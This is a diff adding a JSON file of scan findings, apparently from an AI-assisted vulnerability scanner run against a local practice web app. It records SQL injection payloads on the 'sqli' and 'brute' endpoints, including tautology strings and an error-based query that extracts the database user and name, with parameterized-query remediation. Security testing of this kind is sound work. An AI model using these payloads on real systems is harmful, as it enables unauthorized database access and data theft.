@@ -1,0 +1,62 @@
+[
+    {
+        "url": "http://localhost:80/vulnerabilities/sqli/",
+        "form_action": "http://localhost:80/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "' OR '1'='1",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    },
+    {
+        "url": "http://localhost:80/vulnerabilities/sqli/",
+        "form_action": "http://localhost:80/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "\" OR \"1\"=\"1",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    },
+    {
+        "url": "http://localhost:80/vulnerabilities/sqli/",
+        "form_action": "http://localhost:80/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "/* AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (USER())),0x3a,(SELECT DATABASE())) AS X FROM INFORMATION_SCHEMA.COLUMNS GROUP BY X) T)",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    },
+    {
+        "url": "http://localhost:80/vulnerabilities/brute/",
+        "form_action": "http://localhost:80/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "' OR '1'='1",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    },
+    {
+        "url": "http://localhost:80/vulnerabilities/brute/",
+        "form_action": "http://localhost:80/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "\" OR \"1\"=\"1",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    },
+    {
+        "url": "http://localhost:80/vulnerabilities/brute/",
+        "form_action": "http://localhost:80/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "/* AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (USER())),0x3a,(SELECT DATABASE())) AS X FROM INFORMATION_SCHEMA.COLUMNS GROUP BY X) T)",
+        "error_detected": "Database error message found",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
+        "model_used": "qwen2.5"
+    }
+]
